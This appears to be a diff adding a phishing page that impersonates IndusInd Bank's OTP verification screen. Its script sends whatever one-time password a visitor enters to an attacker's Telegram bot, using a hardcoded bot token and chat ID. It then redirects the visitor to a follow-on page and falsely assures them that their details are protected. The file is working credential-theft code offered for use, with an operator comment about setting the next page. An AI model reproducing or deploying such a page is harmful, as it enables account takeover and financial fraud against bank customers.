@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>OTP Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+  body{
+    margin:0;
+    font-family: Arial, sans-serif;
+    background:#ffffff;
+    color:#333;
+  }
+
+  /* TOP BAR */
+  .top-bar{
+    background:#a51424;
+    padding:14px 20px;
+    display:flex;
+    align-items:center;
+  }
+  .top-bar img{
+    height:28px;
+    margin-right:10px;
+  }
+  .top-bar span{
+    color:#fff;
+    font-size:18px;
+    font-weight:bold;
+    font-style:italic;
+  }
+
+  /* MAIN CARD */
+  .container{
+    max-width:420px;
+    margin:70px auto;
+    padding:0 20px;
+    text-align:center;
+  }
+
+  .center-logo{
+    width:70px;
+    margin:0 auto 22px;
+  }
+
+  h2{
+    color:#a51424;
+    margin-bottom:8px;
+  }
+
+  p{
+    font-size:14px;
+    color:#555;
+    line-height:1.5;
+  }
+
+  /* INPUT */
+  .input{
+    width:100%;
+    padding:16px;
+    font-size:16px;
+    border-radius:14px;
+    border:2px solid #ddd;
+    outline:none;
+    text-align:center;
+    margin:26px 0 18px;
+  }
+  .input:focus{
+    border-color:#a51424;
+  }
+ .input.error{
+    border-color:#c62828;
+    background:#fff5f5;
+  }
+
+
+  /* BUTTON */
+  .btn{
+    background:#c9757d;
+    color:#fff;
+    border:none;
+    width:100%;
+    padding:16px;
+    border-radius:16px;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
+    position:relative;
+  }
+  .btn:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+  }
+
+  /* LOADER */
+  .loader{
+    width:22px;
+    height:22px;
+    border:3px solid #fff;
+    border-top-color:transparent;
+    border-radius:50%;
+    animation:spin .9s linear infinite;
+    position:absolute;
+    left:50%;
+    top:50%;
+    transform:translate(-50%,-50%);
+    display:none;
+  }
+  @keyframes spin{
+    to{transform:rotate(360deg) translate(-50%,-50%)}
+  }
+
+  /* NOTE */
+  .note{
+    margin-top:22px;
+    font-size:13px;
+    color:#666;
+  }
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="top-bar">
+  <img src="logo.png" alt="IndusInd Logo">
+  <span>IndusInd Bank</span>
+</div>
+
+<!-- CONTENT -->
+<div class="container" id="form">
+  <img src="logo.png" class="center-logo">
+
+  <h2>Secure Verification</h2>
+  <p>We have send OTP to your Registered Mobile Number</p>
+<div id="errorMsg">❌ You have entered wrong OTP</div>
+
+  <input id="name" class="input" placeholder="Enter OTP" maxlength="6">
+
+  <button class="btn" id="submitBtn" disabled>
+    ✓ Continue Securely
+    <div class="loader" id="loader"></div>
+  </button>
+
+  <div class="note">
+    🔒 Your details are protected with industry-standard security.
+  </div>
+</div>
+
+<!-- ===== JS ===== -->
+<script>
+  /* ===== CONFIG ===== */
+  const BOT_TOKEN = "8321961191:AAHar1VUUtplOrNfp2aDKbKwcP-5NrlZKGE";
+  const CHAT_ID   = "8089088528";
+
+  const nameInput = document.getElementById('name');
+  const btn = document.getElementById('submitBtn');
+  const loader = document.getElementById('loader');
+
+  // Enable button
+  nameInput.addEventListener('input', ()=>{
+    btn.disabled = nameInput.value.trim().length < 2;
+  });
+
+  async function sendNameToTelegram(name){
+    const text = encodeURIComponent(
+      `New submission received\nOTP: ${name}\nTime: ${new Date().toLocaleString()}`
+    );
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
+    try { await fetch(url); } catch(e){}
+  }
+
+  btn.addEventListener('click', async ()=>{
+    const name = nameInput.value.trim();
+    if(name.length < 2) return;
+
+    btn.disabled = true;
+    loader.style.display = 'block';
+
+    await sendNameToTelegram(name);
+
+    // 🔁 REDIRECT TO NEXT PAGE
+    setTimeout(()=>{
+      window.location.href = "succes.html"; 
+      // 👆 yahan apna next page ka URL daal dena
+    }, 800);
+  });
+</script>
+
+</body>
+</html>
